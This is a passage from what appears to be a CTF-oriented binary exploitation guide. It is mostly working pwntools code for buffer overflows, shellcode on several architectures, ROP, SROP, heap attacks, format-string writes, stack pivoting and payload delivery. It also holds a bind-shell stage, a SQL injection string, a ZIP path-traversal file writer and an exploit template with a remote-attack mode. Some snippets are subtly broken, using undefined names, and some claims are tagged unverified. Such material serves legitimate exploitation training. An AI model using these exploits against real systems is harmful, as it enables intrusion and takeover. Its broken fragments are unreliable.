# Use pattern in GDB
gdb ./binary
gdb> r < <(python3 pattern.py)

# At crash, RIP contains "ABC" or "DEF" etc.
# Search pattern for that sequence to find offset
```

### Static Analysis Offset Calculation

**Stack Layout Analysis:**

```python
from pwn import *

context.binary = './binary'
elf = ELF('./binary')

# Disassemble vulnerable function
function_code = elf.disasm(elf.symbols['vulnerable_func'], 100)
print(function_code)

'''
Example output:
push   rbp
mov    rbp, rsp
sub    rsp, 0x50        <- Stack allocation
lea    rax, [rbp-0x50]  <- Buffer location
mov    rdi, rax
call   gets             <- Vulnerable call

Calculation:
- Buffer at rbp-0x50 (80 bytes)
- Saved RBP at rbp (8 bytes)
- Return address at rbp+8
- Offset = 80 + 8 = 88 bytes
'''

stack_allocation = 0x50
saved_rbp_size = 8
offset = stack_allocation + saved_rbp_size

log.info(f"Calculated offset: {offset}")
```

**Using Ghidra Stack Frame:**

```
1. Open function in Ghidra decompiler
2. View → Stack Frame (or press Ctrl+Shift+S)
3. Examine stack layout visualization

Example stack frame:
Offset    Size    Name
------    ----    ----
-0x50     0x48    buffer
-0x08     0x08    saved_rbp
0x00      0x08    return_addr

Offset to return = 0x50 (buffer) + 0x08 (saved_rbp) = 0x58 = 88 bytes
```

### Dynamic Offset Verification

**GDB Offset Calculation:**

```bash
gdb ./binary

# Set breakpoint at vulnerable function
gdb> b vulnerable_func
gdb> r

# At function entry
gdb> p $rbp
# Output: 0x7fffffffde80

gdb> p &buffer
# Output: 0x7fffffffde30

# Calculate offset
python3 -c "print(0x7fffffffde80 - 0x7fffffffde30 + 8)"
# Output: 88

# Alternative: examine buffer address relative to RBP
gdb> disas
# Look for: lea rax,[rbp-0x50]
# Offset = 0x50 + 8 = 88
```

**Automated GDB Script:**

```python
from pwn import *

gdb_script = '''
break vulnerable_func
run
set $buffer_addr = $rbp - 0x50
set $return_addr = $rbp + 0x8
print "Buffer:", $buffer_addr
print "Return:", $return_addr
print "Offset:", $return_addr - $buffer_addr
quit
'''

p = gdb.debug('./binary', gdbscript=gdb_script)
# Reads offset from GDB output
```

### Multiple Return Address Overwrite

**Calculating Multiple Offsets:**

```python
# When exploiting functions that return multiple times
# or overwriting multiple frames

'''
Stack layout:
[buffer]      <- rbp-0x50
[saved_rbp]   <- rbp
[return_addr] <- rbp+8
[caller_rbp]  <- rbp+16
[caller_ret]  <- rbp+24

To overwrite both return addresses:
'''

buffer_size = 0x50
first_ret_offset = buffer_size + 8
second_ret_offset = first_ret_offset + 16

payload = flat([
    b'A' * buffer_size,
    p64(0x4141414141414141),  # Fake RBP
    p64(gadget1),              # First return
    p64(0x4242424242424242),  # Fake caller RBP
    p64(gadget2)               # Second return
])
```

### Format String Offset Calculation

**Direct Parameter Access Offset:**

```python
from pwn import *

# Find format string parameter offset
def find_format_offset(max_offset=50):
    for offset in range(1, max_offset):
        p = process('./binary')
        p.sendline(f'AAAA%{offset}$p'.encode())
        output = p.recvline().decode()
        
        # Check if our marker (0x41414141) appears
        if '0x41414141' in output or '0x61616161' in output.lower():
            log.success(f"Format string offset: {offset}")
            p.close()
            return offset
        p.close()
    
    log.error("Offset not found")
    return None

offset = find_format_offset()
```

**Stack Position Calculation:**

```bash
# Manual method
python -c 'print("AAAA" + ".%p" * 30)' | ./binary

# Output: AAAA.0x7ffd12345678.0x...0x41414141...
# Count %p positions until 0x41414141 appears
# That position is the offset
```

## Payload Crafting Strategies

Constructing reliable, efficient payloads for various exploit scenarios.

### Shellcode Development

**Basic Linux x86-64 Shellcode:**

```python
from pwn import *

context.arch = 'amd64'

# execve("/bin/sh", NULL, NULL)
shellcode_manual = asm('''
    xor rsi, rsi        /* argv = NULL */
    xor rdx, rdx        /* envp = NULL */
    mov rax, 0x68732f6e69622f  /* "/bin/sh" in hex (little-endian) */
    push rax
    mov rdi, rsp        /* rdi points to "/bin/sh" string */
    push 59             /* execve syscall number */
    pop rax
    syscall
''')

# Or use pwntools shellcraft
shellcode_auto = shellcraft.amd64.linux.sh()
shellcode = asm(shellcode_auto)

log.info(f"Shellcode length: {len(shellcode)} bytes")
print(hexdump(shellcode))
```

**Shellcode Constraints:**

```python
# Alphanumeric shellcode (for filtered input)
context.arch = 'amd64'
shellcode = shellcraft.amd64.linux.sh()

# [Unverified] Alphanumeric encoding increases size significantly
# Requires encoder like msfvenom or manual encoding

# Null-free shellcode
shellcode_null_free = asm(shellcraft.amd64.linux.sh()).replace(b'\x00', b'')
if b'\x00' in shellcode_null_free:
    log.error("Shellcode contains null bytes")
else:
    log.success("Shellcode is null-free")

# Small shellcode (size-constrained)
shellcode_small = asm('''
    push 0x3b
    pop rax
    cdq                 /* rdx = 0 */
    push rdx
    movabs rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    syscall
''')
log.info(f"Minimal shellcode: {len(shellcode_small)} bytes")
```

**Staged Shellcode:**

```python
# Stage 1: Read larger payload from socket
stage1 = asm('''
    xor rax, rax        /* read syscall */
    xor rdi, rdi        /* stdin (or socket fd) */
    lea rsi, [rsp+0x200] /* buffer for stage 2 */
    push 0x1000
    pop rdx             /* read 4096 bytes */
    syscall
    jmp rsi             /* execute stage 2 */
''')

# Stage 2: Full-featured payload sent after stage 1 executes
stage2 = asm(shellcraft.amd64.linux.bindsh(1337))

# Send stage 1 in initial exploit
payload1 = b'A' * offset + stage1

# After stage 1 executes, send stage 2
p.send(stage2)
```

### ROP Chain Construction

**Basic ROP Chain Pattern:**

```python
from pwn import *

context.binary = './binary'
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Simple system("/bin/sh") chain
rop_chain = flat([
    rop.find_gadget(['pop rdi', 'ret'])[0],
    next(elf.search(b'/bin/sh')),
    elf.plt['system']
])

payload = b'A' * offset + rop_chain
```

**ret2libc Chain:**

```python
# When libc is not randomized or after leak
libc.address = leaked_libc_base

rop_chain = flat([
    rop.rdi.address,           # pop rdi; ret
    next(libc.search(b'/bin/sh')),
    rop.ret.address,           # Stack alignment (if needed)
    libc.symbols['system']
])

log.info("ROP chain:")
for i, addr in enumerate([rop.rdi.address, next(libc.search(b'/bin/sh')), 
                          rop.ret.address, libc.symbols['system']]):
    log.info(f"  [{i*8:02x}] {hex(addr)}")
```

**Complex ROP with Multiple Calls:**

```python
# Call multiple functions: read(0, buffer, 100); execve(buffer, 0, 0)

rop = ROP(elf)
bss_addr = elf.bss(0x500)  # Writable memory

rop_chain = flat([
    # read(0, bss, 100)
    rop.rdi.address, 0,                    # fd = stdin
    rop.rsi.address, bss_addr,             # buf = bss
    rop.rdx.address, 100,                  # count = 100
    elf.plt['read'],
    
    # execve(bss, 0, 0)
    rop.rdi.address, bss_addr,             # filename = bss
    rop.rsi.address, 0,                    # argv = NULL
    rop.rdx.address, 0,                    # envp = NULL
    elf.plt['execve']
])
```

**SROP (Sigreturn-Oriented Programming):**

```python
from pwn import *

context.arch = 'amd64'
context.binary = './binary'

# When limited gadgets available
# sigreturn syscall (rax=15) restores all registers from stack frame

frame = SigreturnFrame()
frame.rax = 59              # execve syscall
frame.rdi = bss_addr        # "/bin/sh" location
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget  # Address of "syscall; ret"
frame.rsp = bss_addr + 0x100

rop_chain = flat([
    pop_rax_gadget,
    15,                     # sigreturn syscall number
    syscall_gadget,
    bytes(frame)            # Sigreturn frame
])
```

### Heap Exploitation Payloads

**tcache Poisoning:**

```python
from pwn import *

p = process('./heap_binary')

# Allocate and free to populate tcache
alloc(0, 0x80)  # Chunk A
alloc(1, 0x80)  # Chunk B (prevent consolidation)

free(0)         # A -> tcache

# Overwrite tcache next pointer (via overflow in another chunk)
# Target: __malloc_hook or __free_hook

target = libc.symbols['__malloc_hook']

# Poison tcache entry to point to target
edit(0, p64(target))  # Overwrite fd pointer

# Next allocations
alloc(2, 0x80)  # Returns chunk A (consumed from tcache)
alloc(3, 0x80)  # Returns target address!

# Write one_gadget to __malloc_hook
one_gadget = libc.address + 0x4f3d5  # Offset from one_gadget tool
edit(3, p64(one_gadget))

# Trigger malloc to execute hook
alloc(4, 0x10)  # Executes one_gadget
```

**Fastbin Attack:**

```python
# Fastbin duplicate free (double free)

free(0)
free(1)
free(0)  # Duplicate free creates loop

# Fastbin: 0 -> 1 -> 0 -> 1 -> ...

# Allocate and overwrite fd
alloc(2, 0x60)  # Returns chunk 0
edit(2, p64(target_addr))

alloc(3, 0x60)  # Returns chunk 1
alloc(4, 0x60)  # Returns chunk 0 (again)
alloc(5, 0x60)  # Returns target_addr!
```

### Encoding and Obfuscation

**Avoiding Bad Characters:**

```python
from pwn import *

# Bad chars: \x00, \x0a, \x0d
bad_chars = [0x00, 0x0a, 0x0d]

def encode_address(addr):
    # XOR encoding
    key = 0x42
    encoded = p64(addr ^ (key * 0x0101010101010101))
    
    # Verify no bad chars
    if any(b in encoded for b in bytes(bad_chars)):
        log.error(f"Bad char in encoded address: {hex(addr)}")
        return None
    
    return encoded, key

# Decode stub prepended to payload
decode_stub = asm(f'''
    mov rcx, {len(shellcode) // 8}
    lea rsi, [rip + shellcode]
decode_loop:
    xor qword ptr [rsi], {key * 0x0101010101010101}
    add rsi, 8
    loop decode_loop
    jmp shellcode
shellcode:
''')

encoded_payload = encode_stub + encoded_shellcode
```

**URL Encoding for Web Exploits:**

```python
import urllib.parse

# Payload with special characters
raw_payload = b"'; DROP TABLE users; --"

# URL encode
encoded = urllib.parse.quote(raw_payload)
log.info(f"Encoded: {encoded}")

# Double encoding (sometimes necessary)
double_encoded = urllib.parse.quote(encoded)
log.info(f"Double encoded: {double_encoded}")
```

### Payload Templates

**Template for Buffer Overflow:**

```python
from pwn import *

def craft_bof_payload(offset, ret_addr, nop_sled=0, shellcode=b''):
    """
    Standard buffer overflow payload structure
    
    [padding][nop sled][shellcode][return address]
    """
    padding_size = offset - nop_sled - len(shellcode)
    
    if padding_size < 0:
        log.error("Shellcode + NOP sled exceeds buffer size")
        return None
    
    payload = flat([
        b'A' * padding_size,
        b'\x90' * nop_sled,  # NOP sled
        shellcode,
        p64(ret_addr)
    ])
    
    return payload

# Usage
shellcode = asm(shellcraft.amd64.linux.sh())
payload = craft_bof_payload(
    offset=88,
    ret_addr=0x7fffffffe000,  # Stack address (leaked)
    nop_sled=32,
    shellcode=shellcode
)
```

**Template for Format String Write:**

```python
def craft_format_write(target_addr, value, offset):
    """
    Write arbitrary value to arbitrary address via format string
    Uses %n to write number of bytes printed
    """
    # Split value into 4 bytes for multiple writes
    writes = {
        target_addr:     (value & 0xff),
        target_addr + 1: ((value >> 8) & 0xff),
        target_addr + 2: ((value >> 16) & 0xff),
        target_addr + 3: ((value >> 24) & 0xff)
    }
    
    payload = fmtstr_payload(offset, writes, write_size='byte')
    return payload

# Usage
got_entry = elf.got['exit']
system_addr = libc.symbols['system']

payload = craft_format_write(got_entry, system_addr, offset=6)
```

**Template for ret2dlresolve:**

```python
# Advanced technique when no libc leak available
# Resolves arbitrary symbol at runtime

from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

# ret2dlresolve continued
rop.raw(b'A' * offset)
rop.ret2dlresolve(dlresolve)

payload = rop.chain()
log.info(f"ret2dlresolve payload size: {len(payload)}")
```

### Multi-Architecture Payloads

**x86 (32-bit) Adaptations:**

```python
from pwn import *

context.arch = 'i386'
context.bits = 32

# 32-bit calling convention: arguments on stack
# system("/bin/sh") ROP chain

rop_chain_x86 = flat([
    elf.plt['system'],
    0xdeadbeef,           # Fake return address (or exit)
    next(elf.search(b'/bin/sh'))  # Argument on stack
])

# Alternative: use int 0x80 for direct syscalls
shellcode_x86 = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f    /* "//sh" */
    push 0x6e69622f    /* "/bin" */
    mov ebx, esp       /* ebx = "/bin//sh" */
    xor ecx, ecx
    xor edx, edx
    mov al, 0x0b       /* execve syscall */
    int 0x80
''')

log.info(f"x86 shellcode: {len(shellcode_x86)} bytes")
print(hexdump(shellcode_x86))
```

**ARM Payloads:**

```python
context.arch = 'arm'
context.endian = 'little'

# ARM execve shellcode
shellcode_arm = asm('''
    add r0, pc, #12      /* r0 = address of "/bin/sh" */
    mov r1, #0           /* r1 = NULL */
    mov r2, #0           /* r2 = NULL */
    mov r7, #11          /* execve syscall number */
    svc #0               /* syscall */
    .string "/bin/sh"
''')

# ARM64 (aarch64)
context.arch = 'aarch64'

shellcode_arm64 = asm('''
    mov x0, sp           /* x0 = stack pointer */
    mov x1, #0
    mov x2, #0
    mov x8, #221         /* execve syscall for arm64 */
    svc #0
''')
```

**MIPS Payloads:**

```python
context.arch = 'mips'
context.endian = 'little'  # or 'big' depending on target

# MIPS execve shellcode
# [Unverified] MIPS has branch delay slots that affect shellcode structure
shellcode_mips = asm('''
    li $v0, 4011        /* execve syscall */
    li $a0, 0x2f62696e  /* "/bin" part 1 */
    li $a1, 0x2f736800  /* "/sh\0" part 2 */
    sw $a0, -8($sp)
    sw $a1, -4($sp)
    addiu $a0, $sp, -8  /* $a0 = "/bin/sh" */
    li $a1, 0
    li $a2, 0
    syscall
''')
```

### Payload Size Optimization

**Minimizing ROP Chain Length:**

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Method 1: One-gadget (single address for shell)
# Find with: one_gadget libc.so.6
one_gadget_offsets = [0x4f3d5, 0x4f432, 0x10a41c]

# Test constraints for each one-gadget
libc.address = leaked_libc_base

for offset in one_gadget_offsets:
    payload = b'A' * offset_to_ret + p64(libc.address + offset)
    log.info(f"Trying one-gadget at offset {hex(offset)}")
    # Send and test

# Method 2: Minimal ROP chain
# Instead of full chain, use existing stack values

'''
If stack already contains useful values:
[buffer]
[saved rbp]
[return_addr]  <- overwrite to gadget
[existing_arg1] <- already on stack from previous call
[existing_arg2]
[existing_func] <- function pointer already present

Only need to overwrite return address, saving space
'''

payload_minimal = b'A' * offset + p64(useful_gadget)
```

**Compression Techniques:**

```python
# For payloads sent over network with size limits

import zlib

original_payload = shellcode + rop_chain
compressed = zlib.compress(original_payload)

log.info(f"Original size: {len(original_payload)}")
log.info(f"Compressed size: {len(compressed)}")
log.info(f"Ratio: {len(compressed)/len(original_payload):.2%}")

# Decompression stub (if target has zlib)
decompress_stub = '''
import zlib
exec(zlib.decompress(%s))
''' % compressed

# For binary payloads, need decompressor in shellcode
# [Inference] This adds significant complexity and may not be practical
```

### Payload Testing and Validation

**Local Testing Framework:**

```python
from pwn import *

def test_payload(payload, description=""):
    """
    Test payload locally and verify success
    """
    log.info(f"Testing: {description}")
    
    try:
        p = process('./binary')
        p.sendline(payload)
        
        # Check for shell
        p.sendline(b'echo PWNED')
        response = p.recvline(timeout=2)
        
        if b'PWNED' in response:
            log.success(f"✓ {description} - Shell obtained")
            p.close()
            return True
        else:
            log.failure(f"✗ {description} - No shell")
            p.close()
            return False
            
    except EOFError:
        log.failure(f"✗ {description} - Process crashed")
        return False
    except Exception as e:
        log.failure(f"✗ {description} - Error: {e}")
        return False

# Test multiple payload variants
payloads = [
    (payload_v1, "Basic overflow"),
    (payload_v2, "With NOP sled"),
    (payload_v3, "ROP chain"),
]

for payload, desc in payloads:
    test_payload(payload, desc)
```

**Remote Payload Validation:**

```python
def validate_remote_exploit(host, port, payload):
    """
    Test against remote target with safety checks
    """
    log.info(f"Connecting to {host}:{port}")
    
    try:
        p = remote(host, port)
        
        # Send payload
        p.sendline(payload)
        
        # Wait for response
        try:
            response = p.recv(timeout=5)
            log.info(f"Response: {response[:100]}")
            
            # Check for shell indicators
            p.sendline(b'id')
            output = p.recvline(timeout=2)
            
            if b'uid=' in output:
                log.success("Remote shell obtained!")
                p.interactive()
                return True
            else:
                log.warning("Payload sent but no shell detected")
                return False
                
        except EOFError:
            log.error("Connection closed by remote")
            return False
            
    except Exception as e:
        log.error(f"Remote exploit failed: {e}")
        return False
    finally:
        try:
            p.close()
        except:
            pass
```

### Payload Debugging

**GDB Integration for Payload Analysis:**

```python
from pwn import *

# Test payload with GDB attached
gdb_script = '''
break *vulnerable_func+123
commands
    x/40gx $rsp
    info registers
    continue
end

break *vulnerable_func+200
commands
    x/i $rip
    x/10gx $rsp
    continue
end

continue
'''

p = gdb.debug('./binary', gdbscript=gdb_script)
p.sendline(payload)
p.interactive()
```

**Payload Hexdump and Analysis:**

```python
def analyze_payload(payload, offset):
    """
    Display payload structure with annotations
    """
    log.info("Payload structure:")
    
    # Padding section
    log.info(f"[0x00-0x{offset:02x}] Padding: {offset} bytes")
    print(hexdump(payload[:offset]))
    
    # Control data section
    log.info(f"[0x{offset:02x}-0x{len(payload):02x}] Control data:")
    control_data = payload[offset:]
    
    # Parse as addresses (8-byte chunks)
    for i in range(0, len(control_data), 8):
        chunk = control_data[i:i+8]
        if len(chunk) == 8:
            addr = u64(chunk)
            log.info(f"  [{offset+i:02x}] {hex(addr)}")
    
    print(hexdump(payload))
    
    # Size analysis
    log.info(f"Total payload size: {len(payload)} bytes")
    
    # Bad character check
    bad_chars = [b'\x00', b'\x0a', b'\x0d']
    for char in bad_chars:
        count = payload.count(char)
        if count > 0:
            log.warning(f"Contains {count} instances of {char.hex()}")

# Usage
analyze_payload(exploit_payload, offset=88)
```

**Incremental Payload Testing:**

```python
def test_incremental():
    """
    Test payload components incrementally
    """
    # Test 1: Just overflow to crash
    log.info("Test 1: Basic overflow")
    p = process('./binary')
    p.sendline(b'A' * 200)
    try:
        p.recv(timeout=1)
        log.success("Process crashed as expected")
    except EOFError:
        log.success("Process terminated")
    p.close()
    
    # Test 2: Controlled RIP
    log.info("Test 2: Control RIP")
    p = process('./binary')
    payload = b'A' * offset + p64(0x4141414141414141)
    p.sendline(payload)
    p.wait()
    
    core = Coredump('./core')
    if core.rip == 0x4141414141414141:
        log.success("RIP controlled successfully")
    
    # Test 3: Valid gadget address
    log.info("Test 3: Jump to gadget")
    p = process('./binary')
    payload = b'A' * offset + p64(ret_gadget)
    p.sendline(payload)
    # Check if reaches gadget without crash
    
    # Test 4: Full ROP chain
    log.info("Test 4: Full exploit")
    p = process('./binary')
    p.sendline(full_payload)
    # Verify shell

test_incremental()
```

### Advanced Payload Techniques

**Stack Pivoting:**

```python
# When overflow is limited, pivot stack to larger controlled area

# Step 1: Find pivot gadget
pivot_gadget = None
for gadget in rop.gadgets:
    if 'xchg' in gadget and 'rsp' in gadget:
        pivot_gadget = gadget
        break

# Alternative pivots:
# - leave; ret (mov rsp, rbp; pop rbp; ret)
# - pop rsp; ret
# - add rsp, 0x??; ret

# Step 2: Place ROP chain in controlled memory
bss_addr = elf.bss(0x800)

# Initial payload: write ROP chain to BSS
payload_stage1 = flat([
    b'A' * offset,
    rop.rdi.address, 0,           # read(stdin,
    rop.rsi.address, bss_addr,    #       bss,
    rop.rdx.address, 0x400,       #       1024)
    elf.plt['read'],
    pop_rsp_gadget, bss_addr      # Pivot to BSS
])

p.sendline(payload_stage1)

# Stage 2: Full ROP chain sent to BSS
payload_stage2 = flat([
    rop.rdi.address,
    next(libc.search(b'/bin/sh')),
    libc.symbols['system']
])

p.sendline(payload_stage2)
```

**Partial Overwrite Exploitation:**

```python
# When ASLR limits what bytes can be changed
# Useful for PIE binaries with limited overflow

# [Inference] PIE randomizes upper bytes, lower 12 bits stay constant

# Example: Can only overwrite 2 bytes of return address
# Target function at offset 0x1234 in PIE binary
# Current RIP: 0x5555555551a9
# Want to jump to: 0x555555555234

# Only need to overwrite lower 2 bytes: 0x5234

payload = flat([
    b'A' * offset,
    b'\x34\x52'  # Partial overwrite (little-endian)
    # Upper 6 bytes remain unchanged
])

log.info("Partial overwrite: only 2 bytes modified")
log.info("Success probability: 1/1 (no randomization in lower 12 bits)")
```

**FSOP (File Stream Oriented Programming):**

```python
# Advanced heap exploitation via FILE structure manipulation
# [Unverified] Technique complexity varies by libc version

# Fake FILE structure
fake_file = flat([
    0,                    # _flags
    0,                    # _IO_read_ptr
    0,                    # _IO_read_end
    0,                    # _IO_read_base
    0,                    # _IO_write_base
    0,                    # _IO_write_ptr
    0,                    # _IO_write_end
    0,                    # _IO_buf_base
    0,                    # _IO_buf_end
    # ... more fields
    system_addr,          # vtable function pointer
])

# Write fake FILE to heap
edit(chunk_id, fake_file)

# Trigger FILE operations (fclose, fflush, etc.)
# Executes system_addr
```

**ret2csu Technique:**

```python
# Use __libc_csu_init gadgets for universal argument control
# Present in most dynamically linked binaries

# Find gadgets in __libc_csu_init
csu_gadgets = '''
0x400880 pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x400866 mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
'''

pop_rbx = 0x400880
call_gadget = 0x400866

# Setup for function call: func(rdi, rsi, rdx)
rop_chain = flat([
    pop_rbx,
    0,                    # rbx (multiplier)
    1,                    # rbp (dummy)
    function_got,         # r12 (function pointer location)
    arg1,                 # r13 (rdi)
    arg2,                 # r14 (rsi)
    arg3,                 # r15 (rdx)
    call_gadget,
    # Add dummy values for stack cleanup
    0, 0, 0, 0, 0, 0, 0
])

log.info("ret2csu ROP chain constructed")
```

### Payload Delivery Methods

**Socket-based Delivery:**

```python
def send_exploit_socket(host, port, payload):
    """
    Send payload over raw socket with proper framing
    """
    import socket
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Some services expect specific format
    # Example: length prefix
    length_prefix = p32(len(payload))
    sock.send(length_prefix + payload)
    
    # Or newline-delimited
    sock.send(payload + b'\n')
    
    # Receive response
    response = sock.recv(4096)
    log.info(f"Response: {response}")
    
    sock.close()
```

**HTTP-based Delivery:**

```python
import requests

def exploit_http(url, payload):
    """
    Deliver payload via HTTP parameter
    """
    # GET parameter
    response = requests.get(url, params={'input': payload})
    
    # POST data
    response = requests.post(url, data={'input': payload})
    
    # JSON payload
    response = requests.post(url, json={'input': payload.hex()})
    
    # Header injection
    headers = {'X-Custom-Header': payload.decode('latin-1')}
    response = requests.get(url, headers=headers)
    
    log.info(f"Status: {response.status_code}")
    return response.text
```

**File-based Exploitation:**

```python
def craft_malicious_file(filename, payload):
    """
    Create exploit file for file parsing vulnerabilities
    """
    # Example: PDF with exploit in metadata
    # Example: Image with shellcode in EXIF
    # Example: Archive with path traversal
    
    with open(filename, 'wb') as f:
        # File header
        f.write(b'HEADER')
        
        # Embedded payload
        f.write(payload)
        
        # File footer
        f.write(b'FOOTER')
    
    log.success(f"Created malicious file: {filename}")

# ZIP path traversal
from zipfile import ZipFile

with ZipFile('exploit.zip', 'w') as zf:
    # Craft filename with traversal
    zf.writestr('../../../../tmp/shell.sh', payload)
```

### Payload Checklist

**Pre-deployment Verification:**

```python
def verify_payload(payload, target_binary):
    """
    Comprehensive payload validation before remote deployment
    """
    checks = []
    
    # 1. Size check
    if len(payload) > 4096:
        checks.append(("Size", "WARNING", f"{len(payload)} bytes"))
    else:
        checks.append(("Size", "OK", f"{len(payload)} bytes"))
    
    # 2. Bad character check
    bad_chars = [b'\x00', b'\x0a', b'\x0d']
    found_bad = []
    for char in bad_chars:
        if char in payload:
            found_bad.append(char.hex())
    
    if found_bad:
        checks.append(("Bad chars", "FAIL", f"Found: {found_bad}"))
    else:
        checks.append(("Bad chars", "OK", "None found"))
    
    # 3. Address validity
    # Extract addresses (8-byte aligned chunks)
    addresses = []
    for i in range(0, len(payload) - 7, 8):
        addr = u64(payload[i:i+8])
        if 0x400000 <= addr <= 0x7fffffffffff:
            addresses.append(hex(addr))
    
    checks.append(("Addresses", "INFO", f"{len(addresses)} found"))
    
    # 4. Local test
    try:
        p = process(target_binary)
        p.sendline(payload)
        p.sendline(b'echo TEST')
        output = p.recvline(timeout=2)
        if b'TEST' in output:
            checks.append(("Local test", "OK", "Shell obtained"))
        else:
            checks.append(("Local test", "FAIL", "No shell"))
        p.close()
    except:
        checks.append(("Local test", "FAIL", "Crashed"))
    
    # Print results
    log.info("Payload verification:")
    for check, status, info in checks:
        if status == "OK":
            log.success(f"  {check}: {info}")
        elif status == "WARNING":
            log.warning(f"  {check}: {info}")
        elif status == "FAIL":
            log.failure(f"  {check}: {info}")
        else:
            log.info(f"  {check}: {info}")
    
    return all(s != "FAIL" for _, s, _ in checks)

# Usage
if verify_payload(final_payload, './binary'):
    log.success("Payload validated - ready for deployment")
else:
    log.error("Payload validation failed")
```

### Documentation Template

```python
"""
Exploit: Binary Name
Author: Your Name
Date: 2025-10-19

Vulnerability: Buffer overflow in function_name()
Binary protections:
    - NX: Enabled
    - PIE: Disabled  
    - Canary: Disabled
    - RELRO: Partial

Exploit strategy:
    1. Overflow buffer at offset 88
    2. Overwrite return address with ROP chain
    3. ret2libc to system("/bin/sh")

Requirements:
    - pwntools
    - libc.so.6 (version 2.31)

Usage:
    python exploit.py LOCAL    # Test locally
    python exploit.py REMOTE   # Attack remote target
"""

from pwn import *

# Configuration
BINARY = './binary'
LIBC = './libc.so.6'
HOST = 'target.com'
PORT = 1337

# Offsets (calculated via pattern_create/pattern_offset)
OFFSET_TO_RIP = 88

# Addresses (from analysis)
POP_RDI = 0x401234
RET = 0x401001

def exploit():
    # Setup
    context.binary = BINARY
    elf = ELF(BINARY)
    libc = ELF(LIBC)
    
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process(BINARY)
    
    # Exploitation steps documented inline
    # ...
    
    p.interactive()

if __name__ == '__main__':
    exploit()
```

**Important Considerations:**

[Inference] Modern systems increasingly use:

- Control Flow Integrity (CFI) - restricts indirect jumps
- Shadow stacks - duplicate stack for return addresses
- Pointer authentication (ARM) - cryptographic pointer validation

[Unverified] Success rates for exploitation techniques vary significantly based on:

- Target kernel version and configuration
- Libc version and compilation flags
- Presence of additional security modules (SELinux, AppArmor)

These factors should be investigated during reconnaissance phase.

**Recommended Subtopics:**

- Kernel exploitation methodologies
- Advanced heap exploitation (House of techniques)
- Bypassing modern mitigations (CFI, CET, PAC)
- Exploit reliability engineering and automation

---

## Testing and Debugging Exploits

### Local Development Environment Setup

**Standardized Testing Infrastructure**

```bash
# Create isolated testing environment
mkdir -p ~/ctf/{challenge_name}/{exploit,analysis,notes}
cd ~/ctf/challenge_name

# Set up consistent directory structure
├── exploit/
│   ├── exploit.py       # Main exploit script
│   ├── exploit_local.py # Local testing variant
│   └── requirements.txt # Dependencies
├── analysis/
│   ├── binary          # Target binary
│   ├── libc.so.6       # Provided libc
│   ├── ld-linux.so.2   # Provided loader
│   └── notes.md        # Analysis findings
└── notes/
    ├── offsets.txt     # Calculated offsets
    └── addresses.txt   # Leaked addresses
```

**Reproducible Binary Execution**

```bash
# Disable ASLR for consistent debugging
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Run with specific libc version
patchelf --set-interpreter ./ld-2.31.so ./binary
patchelf --set-rpath . ./binary
LD_PRELOAD=./libc.so.6 ./binary

# Or use pwntools
python3 -c "from pwn import *; process(['./ld-2.31.so', './binary'], env={'LD_PRELOAD':'./libc.so.6'})"
```

### Exploit Development Workflow

**Iterative Testing Pattern**

```python
#!/usr/bin/env python3
from pwn import *

# Configuration switches for different test phases
LOCAL = True
DEBUG = True
ATTACH_GDB = False

if LOCAL:
    p = process('./binary')
    if ATTACH_GDB:
        gdb.attach(p, '''
            b *main+123
            c
        ''')
else:
    p = remote('target.ctf', 1337)

# Modular exploit stages for isolated testing
def stage1_leak():
    """Test information leak independently"""
    # Stage-specific code
    pass

def stage2_exploit():
    """Test exploitation after confirming leak works"""
    # Stage-specific code
    pass

# Enable/disable stages during development
if True:  # Test leak stage
    stage1_leak()
if False:  # Disable exploit stage until leak works
    stage2_exploit()

p.interactive()
```

**Logging and Verbosity Control**

```python
from pwn import *

# Set appropriate log level
context.log_level = 'debug'  # 'debug', 'info', 'warn', 'error'

# Structured logging for debugging
def exploit_step(step_name):
    """Decorator for logging exploit stages"""
    def decorator(func):
        def wrapper(*args, **kwargs):
            log.info(f"Starting: {step_name}")
            result = func(*args, **kwargs)
            log.success(f"Completed: {step_name}")
            return result
        return wrapper
    return decorator

@exploit_step("Leak libc address")
def leak_libc():
    # Implementation
    return leaked_addr

# Conditional logging
if DEBUG:
    log.info(f"Payload: {hexdump(payload)}")
    log.info(f"Leaked value: {hex(leak)}")
```

### GDB-Based Debugging Techniques

**Automated GDB Attachment**

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']  # Or 'gnome-terminal', '-e'

p = process('./binary')

# Attach with pre-configured breakpoints
gdb_script = '''
# Set breakpoints at critical points
b *main+200
b *vulnerable_function+50

# Custom commands
define leak
    x/20gx $rsp
    x/gx $rsp+0x48
end

# Continue to first breakpoint
c
'''

gdb.attach(p, gdb_script)
```

**Runtime State Inspection**

```bash
# In GDB, verify exploit conditions
gef➤ canary        # Check canary value
gef➤ vmmap         # Verify ASLR state
gef➤ heap chunks   # Inspect heap layout
gef➤ telescope $rsp 30  # Examine stack

# Compare expected vs actual state
gef➤ x/s 0x7ffff7e0c000  # Verify leaked address points to expected data

# Trace control flow
gef➤ trace-run     # Log all executed instructions
```

**Checkpoint-Based Debugging**

```python
# In exploit script, add strategic pauses
p.sendline(payload_stage1)
log.info("Stage 1 sent. Check GDB state.")
pause()  # Wait for manual inspection

p.sendline(payload_stage2)
log.info("Stage 2 sent. Check stack corruption.")
pause()
```

### Common Debugging Scenarios

**Payload Not Reaching Target**

```python
# Verify payload transmission
payload = b'A' * 100
log.info(f"Payload length: {len(payload)}")
log.info(f"Payload hex: {payload.hex()}")

p.send(payload)
p.recvuntil(b'Response: ')  # Ensure synchronization

# Check for truncation
received = p.recv()
if len(received) < len(payload):
    log.error(f"Truncation detected: sent {len(payload)}, received {len(received)}")
```

**Incorrect Address Calculations**

```python
# Validate address alignment
def validate_address(addr, name):
